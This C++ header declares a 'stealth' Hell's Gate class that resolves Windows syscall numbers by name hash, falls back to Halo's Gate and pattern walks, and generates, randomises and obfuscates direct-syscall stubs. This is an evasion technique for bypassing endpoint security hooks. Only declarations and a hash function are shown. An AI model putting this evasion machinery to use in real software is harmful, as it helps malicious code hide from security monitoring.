#pragma once
#include <diarna/compiler_port.hpp>
#include <cstdint>
#include <string>
#include <vector>
#include <span>
#include <map>
#include <mutex>
#include <atomic>

namespace diarna::stealth {

struct SyscallDescriptor {
    uint16_t ssn;
    uint32_t hash;
    char name[64];
};

class HellsGate {
public:
    static HellsGate& instance();

    bool initialize();
    void refresh_syscall_numbers();
    uint16_t resolve_hash(uint32_t hash);
    uint16_t resolve_name(const char* name);

    void* get_syscall_stub(uint16_t ssn);
    void* get_syscall_stub_by_hash(uint32_t hash);
    void* get_syscall_stub_by_name(const char* name);

    void randomize_all_stubs();
    void obfuscate_stub_region();
    bool is_stub_tainted(void* stub);

    struct SyscallInfo {
        uint16_t ssn;
        uint32_t name_hash;
        std::string name;
        void* stub_address;
        uint32_t stub_hash;
        bool is_wow64_stub;
        std::chrono::steady_clock::time_point last_refresh;
    };
    std::vector<SyscallInfo> enumerate_syscalls() const;

private:
    HellsGate();
    ~HellsGate();
    HellsGate(const HellsGate&) = delete;
    HellsGate& operator=(const HellsGate&) = delete;

    bool resolve_from_disk();
    bool resolve_from_memory();
    bool resolve_using_pattern_walk();
    bool resolve_using_halos_gate(uint16_t starting_ssn);

    void generate_wow64_stubs();
    void generate_x64_stubs();
    void deobfuscate_stub_region();
    void deobfuscate_single_stub(size_t stub_index, uint8_t* out_buf, size_t buf_size) const;
    bool validate_stub(void* stub, uint16_t expected_ssn);

    uint32_t djb2_hash(const char* str);
    uint32_t ror13_hash(const char* str);
    uint32_t fnv1a_hash(const char* str);

    struct StoredSyscall {
        uint16_t ssn;
        uint32_t hash;
        std::string name;
        void* x64_stub;
        void* wow64_stub;
        uint32_t stub_checksum;
        bool validated;
    };

    std::vector<StoredSyscall> syscalls_;
    std::map<uint16_t, StoredSyscall*> ssn_index_;
    std::map<uint32_t, StoredSyscall*> hash_index_;
    mutable std::mutex syscall_mutex_;
    void* stub_region_;
    size_t stub_region_size_;
    bool initialized_;
    bool is_wow64_;
    bool stub_obfuscated_ = false;
    uint32_t stub_key_ = 0;
    void* stub_scratch_ = nullptr;

    std::atomic<uint64_t> refresh_counter_{0};
    std::chrono::steady_clock::time_point last_full_refresh_;

    static constexpr size_t STUB_SIZE = 64;
    static constexpr uint32_t STUB_MAGIC = 0x41474554;
};

inline uint32_t HASH_SYSCALL(const char* name) {
    uint32_t h = 0x811C9DC5;
    while (*name) { h ^= (uint8_t)*name++; h *= 0x01000193; }
    return h;
}

#define HSYSCALL(name) HellsGate::instance().get_syscall_stub_by_name(#name)

} // namespace diarna::stealth
